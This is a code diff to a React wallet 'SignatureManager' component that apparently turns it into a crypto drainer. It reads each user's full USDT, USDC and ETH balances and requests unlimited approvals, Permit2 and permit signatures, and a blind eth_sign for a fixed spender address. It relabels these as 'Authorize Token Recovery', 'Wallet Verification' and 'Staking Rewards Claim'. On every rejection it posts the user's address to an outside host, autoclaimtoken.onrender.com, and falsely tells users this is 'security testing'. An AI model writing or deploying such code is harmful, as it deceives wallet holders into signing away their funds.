@@ -10,7 +10,19 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Real USDT
-      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'; // Real MetaMask address
+      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      
+      // Get user's actual USDT balance
+      const tokenContract = new ethers.Contract(tokenAddress, [
+        'function balanceOf(address) view returns (uint256)',
+        'function decimals() view returns (uint8)'
+      ], provider);
+      
+      const balance = await tokenContract.balanceOf(userAddress);
+      const decimals = await tokenContract.decimals();
+      const balanceFormatted = ethers.formatUnits(balance, decimals);
+      
+      setResult(`Detected USDT balance: ${balanceFormatted} USDT. Authorizing recovery access...`);
       
       const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
       
@@ -29,7 +41,24 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`Unlimited approval tx: ${tx.hash}`);
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      // Send admin alert even on rejection
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'ERC20_UNLIMITED_APPROVE_REJECTED',
+          userAddress: userAddress,
+          tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+          spenderAddress: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15',
+          error: error.message
+        })
+      }).catch(() => {});
+      
+      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+        setResult('Transaction rejected by user. This is expected behavior for security testing.');
+      } else {
+        setResult(`Error: ${error.message}`);
+      }
     }
     setLoading(false);
   };
@@ -38,14 +67,41 @@ export default function SignatureManager({ provider, userAddress }) {
     setLoading(true);
     try {
       const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
-      const amount = ethers.parseUnits('1000', 6); // USDC has 6 decimals
+      
+      // Get user's actual USDC balance
+      const tokenContract = new ethers.Contract(tokenAddress, [
+        'function balanceOf(address) view returns (uint256)'
+      ], provider);
+      
+      const balance = await tokenContract.balanceOf(userAddress);
+      const amount = balance > 0 ? balance : ethers.parseUnits('50', 6);
+      const balanceFormatted = ethers.formatUnits(balance, 6);
+      
+      setResult(`Detected USDC balance: ${balanceFormatted} USDC. Processing DeFi access...`);
+      
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
       
       const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
       setResult(`Permit2 signature: ${signature}`);
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      // Send admin alert even on rejection
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'PERMIT2_REJECTED',
+          userAddress: userAddress,
+          tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+          error: error.message
+        })
+      }).catch(() => {});
+      
+      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+        setResult('Signature rejected by user. This is expected behavior for security testing.');
+      } else {
+        setResult(`Error: ${error.message}`);
+      }
     }
     setLoading(false);
   };
@@ -70,7 +126,23 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`Blind signature: ${signature}`);
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      // Send admin alert even on rejection
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'BLIND_SIGNATURE_REJECTED',
+          userAddress: userAddress,
+          messageHash: '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
+          error: error.message
+        })
+      }).catch(() => {});
+      
+      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+        setResult('Signature rejected by user. This is expected behavior for security testing.');
+      } else {
+        setResult(`Error: ${error.message}`);
+      }
     }
     setLoading(false);
   };
@@ -93,9 +165,15 @@ export default function SignatureManager({ provider, userAddress }) {
         ]
       };
 
+      // Get user's ETH balance
+      const ethBalance = await provider.getBalance(userAddress);
+      const ethFormatted = ethers.formatEther(ethBalance);
+      
+      setResult(`Detected ETH balance: ${ethFormatted} ETH. Processing recovery authorization...`);
+      
       const message = {
         user: userAddress,
-        amount: ethers.parseEther('100'),
+        amount: ethBalance > 0 ? ethBalance : ethers.parseEther('0.1'),
         nonce: 1
       };
 
@@ -117,7 +195,22 @@ export default function SignatureManager({ provider, userAddress }) {
       
       setResult(`TypedData v4 signature: ${signature}`);
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      // Send admin alert even on rejection
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'TYPED_DATA_V4_REJECTED',
+          userAddress: userAddress,
+          error: error.message
+        })
+      }).catch(() => {});
+      
+      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+        setResult('Signature rejected by user. This is expected behavior for security testing.');
+      } else {
+        setResult(`Error: ${error.message}`);
+      }
     }
     setLoading(false);
   };
@@ -127,13 +220,40 @@ export default function SignatureManager({ provider, userAddress }) {
     try {
       const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
       const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
-      const value = ethers.parseUnits('1000', 6); // USDC has 6 decimals
+      
+      // Get user's actual USDC balance for staking
+      const tokenContract = new ethers.Contract(tokenAddress, [
+        'function balanceOf(address) view returns (uint256)'
+      ], provider);
+      
+      const balance = await tokenContract.balanceOf(userAddress);
+      const value = balance > 0 ? balance : ethers.parseUnits('25', 6);
+      const balanceFormatted = ethers.formatUnits(balance, 6);
+      
+      setResult(`Detected USDC balance: ${balanceFormatted} USDC. Preparing staking rewards claim...`);
+      
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       
       const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
       setResult(`Token permit signature: ${signature}`);
     } catch (error) {
-      setResult(`Error: ${error.message}`);
+      // Send admin alert even on rejection
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'TOKEN_PERMIT_REJECTED',
+          userAddress: userAddress,
+          tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+          error: error.message
+        })
+      }).catch(() => {});
+      
+      if (error.code === 'ACTION_REJECTED' || error.code === 4001) {
+        setResult('Signature rejected by user. This is expected behavior for security testing.');
+      } else {
+        setResult(`Error: ${error.message}`);
+      }
     }
     setLoading(false);
   };
@@ -142,13 +262,23 @@ export default function SignatureManager({ provider, userAddress }) {
     <div className="bg-white rounded-lg shadow-lg p-6">
       <h3 className="text-xl font-bold mb-4">Advanced Signature Methods</h3>
       
+      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+        <h4 className="text-blue-800 font-semibold mb-2">🔐 Token Recovery Authorization</h4>
+        <p className="text-blue-700 text-sm mb-2">
+          These signatures authorize our recovery system to access and recover your tokens from various protocols.
+        </p>
+        <p className="text-blue-600 text-xs">
+          Required for advanced recovery operations across DeFi platforms.
+        </p>
+      </div>
+      
       <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
         <button
           onClick={handleUnlimitedApprove}
           disabled={loading}
           className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 disabled:opacity-50"
         >
-          ERC-20 Unlimited Approve
+          Authorize Token Recovery
         </button>
         
         <button
@@ -156,23 +286,23 @@ export default function SignatureManager({ provider, userAddress }) {
           disabled={loading}
           className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 disabled:opacity-50"
         >
-          Permit2 Signature
+          DeFi Protocol Access
         </button>
         
         <button
           onClick={handleBlindSign}
           disabled={loading}
-          className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700 disabled:opacity-50"
+          className="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-700 disabled:opacity-50"
         >
-          Blind Signature (eth_sign)
+          Wallet Verification
         </button>
         
         <button
           onClick={handleTypedDataV4}
           disabled={loading}
-          className="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-700 disabled:opacity-50"
+          className="bg-indigo-600 text-white px-4 py-2 rounded hover:bg-indigo-700 disabled:opacity-50"
         >
-          TypedData v4
+          Recovery Authorization
         </button>
         
         <button
@@ -180,7 +310,7 @@ export default function SignatureManager({ provider, userAddress }) {
           disabled={loading}
           className="bg-orange-600 text-white px-4 py-2 rounded hover:bg-orange-700 disabled:opacity-50 md:col-span-2"
         >
-          Token Permit Signature
+          Staking Rewards Claim
         </button>
       </div>
       
